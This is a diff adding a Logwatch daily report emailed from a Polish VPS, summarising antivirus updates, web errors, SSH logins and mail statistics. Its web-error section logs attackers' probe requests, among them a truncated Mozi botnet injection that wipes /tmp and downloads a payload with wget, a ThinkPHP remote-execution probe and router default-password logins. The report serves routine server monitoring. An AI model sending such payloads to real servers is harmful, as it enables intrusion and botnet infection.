@@ -1,0 +1,224 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id D41943427BA; Sun, 27 Sep 2020 03:33:05 +0200 (CEST)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20200927013305.D41943427BA@hrankiety.pl>
+Date: Sun, 27 Sep 2020 03:33:04 +0200 (CEST)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Sun Sep 27 03:33:04 2020
+        Date Range Processed: yesterday
+                              ( 2020-Sep-26 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Sat Sep 26 03:44:06 2020
+ 
+ Last Status:
+    main.cld is up to date (version: 59, sigs: 4564902, f-level: 60, builder: sigmgr)
+    Downloading daily-25938.cdiff [100%]
+    daily.cld updated (version: 25938, sigs: 4322359, f-level: 63, builder: raynman)
+    Can't query daily.25938.93.1.0.6810DA54.ping.clamav.net
+    bytecode.cld is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)
+    Database updated (8887355 signatures) from db.local.clamav.net (IP: 104.16.218.84)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ Connection attempts using mod_proxy:
+    203.189.239.98 -> g.alicdn.com:443: 2 Time(s)
+    203.189.239.98 -> httpbin.org:443: 2 Time(s)
+    203.189.239.98 -> sm.bdimg.com:443: 2 Time(s)
+ 
+ A total of 3 sites probed the server 
+    192.241.217.64
+    61.219.11.153
+    87.251.75.254
+ 
+ Requests with error response codes
+    400 Bad Request
+       ../../proc/: 2 Time(s)
+       HTTP/1.0: 1 Time(s)
+       g.alicdn.com:443: 2 Time(s)
+       httpbin.org:443: 2 Time(s)
+       null: 3 Time(s)
+       sm.bdimg.com:443: 2 Time(s)
+    404 Not Found
+       /.well-known/security.txt: 2 Time(s)
+       /2018/: 1 Time(s)
+       /2019/: 1 Time(s)
+       /2020/: 1 Time(s)
+       /GponForm/diag_Form?images/: 1 Time(s)
+       /TP/index.php: 1 Time(s)
+       /TP/public/index.php: 1 Time(s)
+       /api/jsonws/invoke: 2 Time(s)
+       /backup/: 1 Time(s)
+       /bak/: 1 Time(s)
+       /bk/: 1 Time(s)
+       /blog/: 1 Time(s)
+       /boaform/admin/formLogin?username=adminisp&psd=adminisp: 1 Time(s)
+       /boaform/admin/formLogin?username=user&psd=user: 1 Time(s)
+       /cms/: 1 Time(s)
+       /config/getuser?index=0: 1 Time(s)
+       /demo/: 1 Time(s)
+       /dev/: 1 Time(s)
+       /dns-query: 1 Time(s)
+       /dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB: 1 Time(s)
+       /home/: 1 Time(s)
+       /html/public/index.php: 1 Time(s)
+       /hudson: 1 Time(s)
+       /index.php?s=/Index/\\think\\app/invokefun ... ]=HelloThinkPHP: 3 Time(s)
+       /install/: 1 Time(s)
+       /login: 1 Time(s)
+       /login/companyInfo/seriously: 1 Time(s)
+       /main/: 1 Time(s)
+       /new-site/: 1 Time(s)
+       /new/: 1 Time(s)
+       /old-site/: 1 Time(s)
+       /old-wp/: 1 Time(s)
+       /old/: 1 Time(s)
+       /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f: 1 Time(s)
+       /public/index.php: 1 Time(s)
+       /shell?cd+/tmp;rm+-rf+*;wget+http://42.234 ... tmp/Mozi.a+jaws: 1 Time(s)
+       /site/: 1 Time(s)
+       /sitemap.xml: 2 Time(s)
+       /solr/admin/info/system?wt=json: 2 Time(s)
+       /temp/: 1 Time(s)
+       /test/: 1 Time(s)
+       /thinkphp/html/public/index.php: 1 Time(s)
+       /tmp/: 1 Time(s)
+       /v1/: 1 Time(s)
+       /v2/: 1 Time(s)
+       /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php: 5 Time(s)
+       /web/: 1 Time(s)
+       /wordpress/: 1 Time(s)
+       /wp/: 1 Time(s)
+       /wp1/: 1 Time(s)
+       /wp2/: 1 Time(s)
+    408 Request Timeout
+       null: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- pam_unix Begin ------------------------ 
+
+ sshd:
+    Authentication Failures:
+       unknown (89-77-70-146.dynamic.chello.pl): 1 Time(s)
+    Invalid Users:
+       Unknown Account: 2 Time(s)
+ 
+ su:
+    Sessions Opened:
+       btertil -> root: 1 Time(s)
+ 
+ 
+ ---------------------- pam_unix End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+      141   *Warning: Pre-queue content-filter connection overload 
+      670   SASL authentication failed 
+       67   Miscellaneous warnings 
+ 
+ 1008.091K  Bytes accepted                         1,032,285
+ 1002.046K  Bytes delivered                        1,026,095
+ ========   ================================================
+ 
+       34   Accepted                                  87.18%
+        5   Rejected                                  12.82%
+ --------   ------------------------------------------------
+       39   Total                                    100.00%
+ ========   ================================================
+ 
+        5   Reject HELO/EHLO                         100.00%
+ --------   ------------------------------------------------
+        5   Total Rejects                            100.00%
+ ========   ================================================
+ 
+        1   4xx Reject relay denied                  100.00%
+ --------   ------------------------------------------------
+        1   Total 4xx Rejects                        100.00%
+ ========   ================================================
+ 
+      827   Connections made      
+       23   Connections lost      
+      827   Disconnections        
+       34   Removed from queue    
+       32   Delivered             
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+      150   Timeout (inbound)     
+ 
+ 
+ 
+ 
+ **Unmatched Entries**
+        1   Sep 26 18:50:31 2626 postfix/smtpd[550]: NOQUEUE: reject: CONNECT from unknown[unknown]: 554 5.7.1 <unknown[unknown]>: Client host rejected: Access denied; proto=SMTP
+        1   Sep 26 18:58:55 2626 postfix/smtpd[724]: NOQUEUE: reject: CONNECT from unknown[unknown]: 554 5.7.1 <unknown[unknown]>: Client host rejected: Access denied; proto=SMTP
+        1   Sep 26 19:20:51 2626 postfix/smtpd[949]: NOQUEUE: reject: CONNECT from unknown[unknown]: 554 5.7.1 <unknown[unknown]>: Client host rejected: Access denied; proto=SMTP
+        1   Sep 26 18:44:42 2626 postfix/smtpd[403]: NOQUEUE: reject: CONNECT from unknown[unknown]: 554 5.7.1 <unknown[unknown]>: Client host rejected: Access denied; proto=SMTP
+        1   Sep 26 19:32:33 2626 postfix/smtpd[1104]: NOQUEUE: reject: CONNECT from unknown[unknown]: 554 5.7.1 <unknown[unknown]>: Client host rejected: Access denied; proto=SMTP
+        1   Sep 26 19:24:47 2626 postfix/smtpd[1052]: NOQUEUE: reject: CONNECT from unknown[unknown]: 554 5.7.1 <unknown[unknown]>: Client host rejected: Access denied; proto=SMTP
+        1   Sep 26 18:43:52 2626 postfix/smtpd[403]: NOQUEUE: reject: CONNECT from unknown[unknown]: 554 5.7.1 <unknown[unknown]>: Client host rejected: Access denied; proto=SMTP
+        1   Sep 26 18:46:54 2626 postfix/smtpd[465]: NOQUEUE: reject: CONNECT from unknown[unknown]: 554 5.7.1 <unknown[unknown]>: Client host rejected: Access denied; proto=SMTP
+        1   Sep 26 19:47:15 2626 postfix/smtpd[1250]: NOQUEUE: reject: CONNECT from unknown[unknown]: 554 5.7.1 <unknown[unknown]>: Client host rejected: Access denied; proto=SMTP
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Illegal users from:
+    89.77.70.146 (89-77-70-146.dynamic.chello.pl): 2 times
+ 
+ Users logging in through sshd:
+    btertil:
+       89.77.70.146 (89-77-70-146.dynamic.chello.pl): 56 times
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 46 Time(s)
+    13: Unable to authenticate : 1 Time(s)
+ 
+ **Unmatched Entries**
+ error: bind: Cannot assign requested address : 6 time(s)
+ error: connect_to localhost port 9999: failed. : 31 time(s)
+ PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=89-77-70-146.dynamic.chello.pl  : 1 time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   32G   17G  67% /
+ none            1.0G  4.0K  1.0G   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
